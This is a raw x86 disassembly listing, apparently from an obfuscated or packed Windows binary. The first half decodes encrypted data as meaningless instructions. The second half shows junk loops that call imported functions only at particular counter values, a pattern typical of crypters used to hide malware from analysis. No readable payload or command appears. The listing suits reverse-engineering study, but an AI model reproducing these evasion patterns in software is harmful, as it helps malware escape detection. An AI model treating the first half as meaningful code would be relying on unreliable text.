  40bbb5:	add    al,0xf2
  40bbb7:	sahf   
  40bbb8:	out    0x81,al
  40bbba:	mov    ebp,0xe72d3fa7
  40bbbf:	pop    edi
  40bbc0:	cmp    edi,DWORD PTR [edi+0x737203fe]
  40bbc6:	push   ss
  40bbc7:	idiv   BYTE PTR [ecx+0x3ec8a1a9]
  40bbcd:	pop    eax
  40bbce:	cs popa 
  40bbd0:	in     eax,dx
  40bbd1:	lock or eax,0x8ceb1ee7
  40bbd7:	rol    BYTE PTR [ebp-0x4d],1
  40bbda:	ja     0x40bb80
  40bbdc:	sar    edx,0x12
  40bbdf:	jo     0x40bba5
  40bbe1:	iret   
  40bbe2:	rcl    edx,1
  40bbe4:	fcom   DWORD PTR [edi+0x4f]
  40bbe7:	jecxz  0x40bbb3
  40bbe9:	mov    WORD PTR [esi-0x473d9a17],gs
  40bbef:	mov    WORD PTR [ecx-0x4b4ed2f7],fs
  40bbf5:	retf   
  40bbf6:	repnz push edi
  40bbf8:	aas    
  40bbf9:	inc    esi
  40bbfa:	pop    ebx
  40bbfb:	cmc    
  40bbfc:	ret    
  40bbfd:	mov    bh,0x3b
  40bbff:	rcl    DWORD PTR [ebp+0x5b32881f],cl
  40bc05:	pop    esp
  40bc06:	inc    esi
  40bc07:	dec    ebx
  40bc08:	add    DWORD PTR [ebp-0x47],esp
  40bc0b:	mov    bl,0x9b
  40bc0d:	push   0x17
  40bc0f:	loopne 0x40bc73
  40bc11:	push   ds
  40bc12:	push   cs
  40bc13:	icebp  
  40bc14:	jbe    0x40bc0d
  40bc16:	inc    esp
  40bc17:	sar    ecx,cl
  40bc19:	in     eax,dx
  40bc1a:	jo     0x40bc53
  40bc1c:	dec    edi
  40bc1d:	(bad)  
  40bc1e:	pop    edi
  40bc1f:	out    0xb4,eax
  40bc21:	stc    
  40bc22:	fcom   QWORD PTR [ebx]
  40bc24:	push   ebp
  40bc25:	sub    eax,0x667c025
  40bc2a:	pop    ecx
  40bc2b:	xor    DWORD PTR [edx+edx*2+0xf],ebx
  40bc2f:	aam    0xbc
  40bc31:	outs   dx,DWORD PTR ds:[esi]
  40bc32:	mov    eax,0xfad5d9be
  40bc37:	push   esp
  40bc38:	xchg   esi,eax
  40bc39:	or     DWORD PTR [edi-0x5267135a],edi
  40bc3f:	add    DWORD PTR ds:0x2702bc0e,esp
  40bc45:	dec    ebp
  40bc46:	(bad)  
  40bc47:	cmp    edi,DWORD PTR [ebx+eiz*1+0x6fa5a82]
  40bc4e:	rol    dl,0x4c
  40bc51:	popa   
  40bc52:	fwait
  40bc53:	ret    
  40bc54:	inc    esi
  40bc55:	nop
  40bc56:	or     DWORD PTR [esi+0x17],edx
  40bc59:	sbb    eax,0xeba16f4c
  40bc5e:	cwde   
  40bc5f:	mov    BYTE PTR [eax],0x2d
  40bc62:	ror    BYTE PTR [edi-0x3c3dfb2d],0xb4
  40bc69:	lea    edx,[ecx-0x146567ac]
  40bc6f:	fist   DWORD PTR [edx]
  40bc71:	mov    ?,WORD PTR [edx+eiz*1-0x41]
  40bc75:	pop    es
  40bc76:	lahf   
  40bc77:	shl    DWORD PTR [ebx-0x21],0x6
  40bc7b:	fdiv   DWORD PTR [eax-0x6675e695]
  40bc81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc82:	mov    DWORD PTR [esi-0x3f],ebx
  40bc85:	popa   
  40bc86:	aas    
  40bc87:	sub    edx,esi
  40bc89:	adc    ch,BYTE PTR ds:0x55d60c0
  40bc8f:	mov    esi,0x760ac4c3
  40bc94:	rol    DWORD PTR ds:0x1cc82432,cl
  40bc9a:	and    bh,BYTE PTR [edi+0x59b3b351]
  40bca0:	inc    ebp
  40bca1:	nop
  40bca2:	sub    bl,BYTE PTR [esi+0x16]
  40bca5:	mov    edx,edx
  40bca7:	jmp    0x474e:0x48505ebc
  40bcae:	mov    al,0x98
  40bcb0:	cmovno ecx,DWORD PTR [ebx+0x4cc9fbe7]
  40bcb7:	adc    ebx,DWORD PTR [esi]
  40bcb9:	mov    cl,0x3
  40bcbb:	inc    ebp
  40bcbc:	fmul   QWORD PTR [edx+0x3d]
  40bcbf:	add    ebx,eax
  40bcc1:	dec    ebp
  40bcc2:	jne    0x40bc6a
  40bcc4:	aaa    
  40bcc5:	pop    ebp
  40bcc6:	and    eax,0xf228d820
  40bccb:	adc    al,0x8a
  40bccd:	pop    ebp
  40bcce:	jle    0x40bcc2
  40bcd0:	(bad)  
  40bcd1:	repz aaa 
  40bcd3:	xor    DWORD PTR [edx-0x56c38bc8],esi
  40bcd9:	stos   DWORD PTR es:[edi],eax
  40bcda:	pop    es
  40bcdb:	nop
  40bcdc:	mov    ebx,0xc2445c5f
  40bce1:	sbb    eax,0xf7489693
  40bce6:	fistp  QWORD PTR [ecx]
  40bce8:	xchg   esp,eax
  40bce9:	inc    esi
  40bcea:	or     eax,0x2db778aa
  40bcef:	gs stos BYTE PTR es:[edi],al
  40bcf1:	cmp    ecx,esp
  40bcf3:	pushf  
  40bcf4:	cwde   
  40bcf5:	push   edx
  40bcf6:	sbb    BYTE PTR [esi+edi*1+0x4],0x7c
  40bcfb:	aad    0xfe
  40bcfd:	in     eax,dx
  40bcfe:	adc    DWORD PTR [ebp-0x184dd74],edx
  40bd04:	stos   BYTE PTR es:[edi],al
  40bd05:	add    bh,BYTE PTR [eax-0x38]
  40bd08:	lahf   
  40bd09:	stos   DWORD PTR es:[edi],eax
  40bd0a:	mov    al,0x34
  40bd0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd0d:	jb     0x40bcb6
  40bd0f:	test   al,0x94
  40bd11:	and    bh,al
  40bd13:	pop    DWORD PTR [esi]
  40bd15:	push   eax
  40bd16:	xor    bh,BYTE PTR [ebx+0x212b53ce]
  40bd1c:	ficomp DWORD PTR [eax+0x42497fde]
  40bd22:	shl    DWORD PTR [eax+ebp*8],0x27
  40bd26:	jl     0x40bd5f
  40bd28:	ror    BYTE PTR [esi-0x7a],1
  40bd2b:	xor    dl,BYTE PTR [esi-0x70834442]
  40bd31:	mov    dl,0xcb
  40bd33:	mov    ds:0xd2f83ba7,eax
  40bd38:	push   ebp
  40bd39:	push   eax
  40bd3a:	fisubr DWORD PTR [eax-0x1a3208a]
  40bd40:	imul   ebp,DWORD PTR [eax-0x23],0xffffffd7
  40bd44:	sbb    esp,esi
  40bd46:	sub    al,0x89
  40bd48:	pop    ebp
  40bd49:	test   al,0x18
  40bd4b:	and    al,0xc9
  40bd4d:	dec    ecx
  40bd4e:	fisttp QWORD PTR [ebx-0x16f776f7]
  40bd54:	sbb    al,0x3
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	xor    ebx,DWORD PTR [esi-0x76]
  40bd67:	or     bl,BYTE PTR [edx+eax*4]
  40bd6a:	jle    0x40bdea
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	adc    DWORD PTR [ebp+0x10806074],0x93c6051a
  40bd7a:	fisub  DWORD PTR [eax+0x30]
  40bd7d:	aaa    
  40bd7e:	cmp    BYTE PTR [ecx-0x72],bh
  40bd81:	pop    ds
  40bd82:	xor    eax,esi
  40bd84:	cmp    al,0x66
  40bd86:	add    bh,cl
  40bd88:	mov    dl,BYTE PTR [edx-0x1d44e430]
  40bd8e:	mov    esi,0x9274e9fd
  40bd93:	jo     0x40bd4f
  40bd95:	push   ds
  40bd96:	jge    0x40bd63
  40bd98:	hlt    
  40bd99:	xor    BYTE PTR [ecx+ebx*8-0x2474ec47],bl
  40bda0:	xor    ah,dl
  40bda2:	ret    
  40bda3:	mov    dh,0xd4
  40bda5:	xor    ecx,ebp
  40bda7:	xchg   esp,eax
  40bda8:	jmp    0xbb94:0x1af812d5
  40bdaf:	test   ah,ah
  40bdb1:	stos   BYTE PTR es:[edi],al
  40bdb2:	mov    ds:0xfe194e0a,eax
  40bdb7:	sbb    eax,0x4d0000f1
  40bdbc:	pop    ss
  40bdbd:	leave  
  40bdbe:	pop    ebp
  40bdbf:	clc    
  40bdc0:	cwde   
  40bdc1:	lods   eax,DWORD PTR ds:[esi]
  40bdc2:	test   DWORD PTR [ecx-0x2a],0x2aeb7ff0
  40bdc9:	fcomp  st(4)
  40bdcb:	loopne 0x40bdff
  40bdcd:	jo     0x40bdb5
  40bdcf:	aas    
  40bdd0:	jmp    0xd231:0xf1ea4d8f
  40bdd7:	test   cl,dh
  40bdd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdda:	fstp   DWORD PTR [edi]
  40bddc:	jnp    0x40bdd5
  40bdde:	cmp    al,0x8f
  40bde0:	and    al,0x90
  40bde2:	out    dx,eax
  40bde3:	fild   DWORD PTR ds:0xf9b1f237
  40bde9:	mov    DWORD PTR [ecx-0x48],0x561c50f0
  40bdf0:	push   0x5b593635
  40bdf5:	xchg   DWORD PTR [edx-0x39f5a8e2],edi
  40bdfb:	arpl   dx,dx
  40bdfd:	bound  esp,QWORD PTR [esp+eiz*8-0x9]
  40be01:	push   esp
  40be02:	push   eax
  40be03:	mov    DWORD PTR [edi],ebx
  40be05:	mov    ebp,0xf19bff3b
  40be0a:	inc    edi
  40be0b:	jno    0x40bdce
  40be0d:	cmp    DWORD PTR [ecx],edi
  40be0f:	jbe    0x40be65
  40be11:	call   0xc8e3:0x3c11192f
  40be18:	xor    DWORD PTR [eax+ebx*4+0x32],ebp
  40be1c:	test   BYTE PTR [eax],al
  40be1e:	inc    bx
  40be20:	xchg   ebx,eax
  40be21:	push   ebx
  40be22:	pop    edi
  40be23:	cdq    
  40be24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be25:	jg     0x40be75
  40be27:	std    
  40be28:	leave  
  40be29:	pop    ecx
  40be2a:	(bad)  
  40be2b:	jb     0x40be3c
  40be2d:	fldcw  WORD PTR [eax-0x1c]
  40be30:	neg    BYTE PTR [esi+0x59]
  40be33:	push   ebx
  40be34:	repz in eax,dx
  40be36:	mov    ebx,0x52912838
  40be3b:	push   ds
  40be3c:	stos   DWORD PTR es:[edi],eax
  40be3d:	shl    BYTE PTR [eax],cl
  40be3f:	add    ebp,0xa
  40be42:	sbb    DWORD PTR [edi+eiz*1],edx
  40be45:	mov    edx,DWORD PTR [ecx]
  40be47:	scas   eax,DWORD PTR es:[edi]
  40be48:	popa   
  40be49:	imul   esp,DWORD PTR ds:0x7fb4df83,0x1c
  40be50:	sub    BYTE PTR [edx+ebp*8-0x6edc9832],dh
  40be57:	xchg   esp,eax
  40be58:	ret    0xb783
  40be5b:	call   0xbb84135a
  40be60:	fs dec edi
  40be62:	pop    edi
  40be63:	test   BYTE PTR [edi+ecx*1-0x4640d991],dh
  40be6a:	inc    eax
  40be6b:	pop    ebp
  40be6c:	(bad)  
  40be6d:	(bad)  
  40be6e:	sbb    eax,0x36f850e5
  40be73:	sub    DWORD PTR [ecx+edx*8],esi
  40be76:	xchg   ebp,eax
  40be77:	ins    DWORD PTR es:[edi],dx
  40be78:	pop    ecx
  40be79:	je     0x40be8a
  40be7b:	mov    esi,0x64d78ce4
  40be80:	mov    cl,0xaa
  40be82:	inc    esp
  40be83:	pop    eax
  40be84:	sbb    DWORD PTR [eax+0x36],0x3
  40be88:	cmp    ch,dl
  40be8a:	iret   
  40be8b:	mov    dl,0xfd
  40be8d:	adc    DWORD PTR [ebx+0x63],edx
  40be90:	repz mov eax,0x215bc266
  40be96:	repz xchg ebx,eax
  40be98:	js     0x40bf03
  40be9a:	rol    bl,cl
  40be9c:	les    esp,FWORD PTR [edx-0x69]
  40be9f:	add    esp,DWORD PTR [ebx+0x2d]
  40bea2:	xor    eax,DWORD PTR [esi+0x71d73865]
  40bea8:	fwait
  40bea9:	dec    ebx
  40beaa:	pusha  
  40beab:	mov    ebp,0x9bbbab3d
  40beb0:	jno    0x40be7e
  40beb2:	sahf   
  40beb3:	lods   eax,DWORD PTR ds:[esi]
  40beb4:	fs mov cl,0xc6
  40beb7:	adc    bl,bh
  40beb9:	imul   edi,DWORD PTR [eax-0x6d312cbf],0xd881f403
  40bec3:	dec    eax
  40bec4:	test   esi,edi
  40bec6:	icebp  
  40bec7:	ins    BYTE PTR es:[edi],dx
  40bec8:	xor    BYTE PTR [edi+0x1cf0717a],bl
  40bece:	dec    eax
  40becf:	cmp    eax,0x892375fa
  40bed4:	arpl   sp,bx
  40bed6:	inc    eax
  40bed7:	std    
  40bed8:	inc    ecx
  40bed9:	adc    BYTE PTR [eax],0xcc
  40bedc:	stc    
  40bedd:	jae    0x40bf16
  40bedf:	jo     0x40bebf
  40bee1:	xor    bl,BYTE PTR [ecx+0x20d545a0]
  40bee7:	or     DWORD PTR ds:0x9929afe,edx
  40beed:	xlat   BYTE PTR ds:[ebx]
  40beee:	or     dl,BYTE PTR [edi-0x4b651fd4]
  40bef4:	jmp    0x40be96
  40bef6:	mov    al,ds:0x5ab49bcb
  40befb:	(bad)  
  40befc:	sub    eax,0x4aacde1f
  40bf01:	push   es
  40bf02:	mov    edi,0x38b02e21
  40bf07:	adc    al,0x14
  40bf09:	adc    DWORD PTR [edi-0x10],edi
  40bf0c:	or     eax,0x3b6daaf
  40bf11:	mov    BYTE PTR [edx],bl
  40bf13:	data16 xchg BYTE PTR [edx+0x18332fe2],cl
  40bf1a:	aam    0x59
  40bf1c:	imul   ebp,DWORD PTR [ebx],0xe608ea35
  40bf22:	rol    BYTE PTR [eax-0x2d],cl
  40bf25:	mov    BYTE PTR [edx+eax*8],bl
  40bf28:	push   0xe8a7e3fe
  40bf2d:	dec    edx
  40bf2e:	test   BYTE PTR [ecx],bl
  40bf30:	mov    ds:0x4d03ca7a,eax
  40bf35:	jmp    0x68aa:0x982d97ce
  40bf3c:	jbe    0x40bf00
  40bf3e:	mov    cl,0x35
  40bf40:	jb     0x40bf64
  40bf42:	jg     0x40bf8a
  40bf44:	pop    ss
  40bf45:	out    dx,eax
  40bf46:	cmp    BYTE PTR [ecx-0x4e1469c4],0x50
  40bf4d:	dec    ecx
  40bf4e:	cwde   
  40bf4f:	dec    eax
  40bf50:	jo     0x40bfa1
  40bf52:	test   eax,0xe791dedb
  40bf57:	xchg   edx,eax
  40bf58:	push   ebp
  40bf59:	cmc    
  40bf5a:	leave  
  40bf5b:	mov    ah,0x26
  40bf5d:	retf   
  40bf5e:	lock xchg ebx,eax
  40bf60:	xlat   BYTE PTR ds:[ebx]
  40bf61:	aad    0x40
  40bf63:	sbb    eax,0xa90d4377
  40bf68:	sub    eax,0x43ce09fd
  40bf6d:	fld    DWORD PTR [eax+0x5eee6656]
  40bf73:	(bad)  
  40bf74:	mov    eax,0x496380fe
  40bf79:	sub    edx,DWORD PTR [edx+ebp*1]
  40bf7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf7d:	add    esi,DWORD PTR [eax-0x62]
  40bf80:	push   es
  40bf81:	(bad)  
  40bf82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf83:	adc    eax,0x7f9d2a14
  40bf88:	jno    0x40bf7d
  40bf8a:	pop    ss
  40bf8b:	cmp    al,BYTE PTR [ebx-0x3ae2d462]
  40bf91:	loop   0x40bf39
  40bf93:	cmp    BYTE PTR [edi+ebp*4+0x67],dh
  40bf97:	leave  
  40bf98:	mov    ch,0x10
  40bf9a:	(bad)  
  40bf9b:	push   ecx
  40bf9c:	cld    
  40bf9d:	mov    ebp,0x76a72239
  40bfa2:	hlt    
  40bfa3:	mov    edi,0xd3a70bf2
  40bfa8:	fst    QWORD PTR [ebp+0x7b]
  40bfab:	add    al,BYTE PTR [edx+0x75ca084e]
  40bfb1:	inc    edx
  40bfb2:	shl    BYTE PTR [ecx],cl
  40bfb4:	push   ebx
  40bfb5:	sahf   
  40bfb6:	pop    ss
  40bfb7:	leave  
  40bfb8:	ins    DWORD PTR es:[edi],dx
  40bfb9:	sub    ch,BYTE PTR [edi-0x12]
  40bfbc:	jb     0x40bf7f
  40bfbe:	out    dx,al
  40bfbf:	cs test eax,0xc711d786
  40bfc5:	cli    
  40bfc6:	aaa    
  40bfc7:	mov    dl,0xca
  40bfc9:	cmp    al,0xb4
  40bfcb:	sbb    eax,0xed7ced2f
  40bfd0:	outs   dx,BYTE PTR ds:[esi]
  40bfd1:	mov    ch,BYTE PTR [ecx]
  40bfd3:	pusha  
  40bfd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfd5:	jb     0x40bf6a
  40bfd7:	cmp    BYTE PTR [ebx+0x35],cl
  40bfda:	jae    0x40bf88
  40bfdc:	or     BYTE PTR [ecx-0x1e9936e1],dl
  40bfe2:	fs mov edi,0xa14158ee
  40bfe8:	inc    esi
  40bfe9:	pop    edx
  40bfea:	add    eax,0xaa97a8d8
  40bfef:	mov    esp,DWORD PTR [edx+0x3c]
  40bff2:	mov    ss,eax
  40bff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff5:	loop   0x40c032
  40bff7:	and    BYTE PTR [ebp+0x68],dh
  40bffa:	scas   eax,DWORD PTR es:[edi]
  40bffb:	push   eax
  40bffc:	pushf  
  40bffd:	int3   
  40bffe:	into   
  40bfff:	sub    DWORD PTR [edx+0x62e8bd5f],eax
  40c005:	out    dx,eax
  40c006:	ja     0x40bfd8
  40c008:	cdq    
  40c009:	pushf  
  40c00a:	push   edi
  40c00b:	pop    eax
  40c00c:	mov    eax,ds:0x4c4b447f
  40c011:	fdiv   QWORD PTR [ecx-0x6de75ed9]
  40c017:	adc    eax,0x1a2a3059
  40c01c:	mul    BYTE PTR ds:0xdeadd77a
  40c022:	mov    edx,DWORD PTR [ebx]
  40c024:	cmp    eax,0xa75a7082
  40c029:	jp     0x40bfee
  40c02b:	dec    ebx
  40c02c:	add    DWORD PTR [esi-0x51],ecx
  40c02f:	pusha  
  40c030:	cmp    eax,0xd595cf11
  40c035:	imul   esp,DWORD PTR [eax],0xffffffc4
  40c038:	test   DWORD PTR ds:0x18f81d64,esp
  40c03e:	add    ch,0x56
  40c041:	call   0xbf59b0fa
  40c046:	push   esp
  40c047:	xor    ebp,ecx
  40c049:	scas   eax,DWORD PTR es:[edi]
  40c04a:	es push edx
  40c04c:	int    0xf1
  40c04e:	or     BYTE PTR [ebx+edx*8],dl
  40c051:	xchg   esi,eax
  40c052:	sub    al,0xb3
  40c054:	dec    esp
  40c055:	xchg   BYTE PTR [edi+0x9260bce],ah
  40c05b:	lahf   
  40c05c:	les    edi,FWORD PTR ds:0x8cbb7e66
  40c062:	and    eax,0xdfc34441
  40c067:	sub    eax,0xdbb79d65
  40c06c:	sbb    DWORD PTR [edx-0x62fcb9fc],ebx
  40c072:	outs   dx,BYTE PTR ds:[esi]
  40c073:	inc    ecx
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
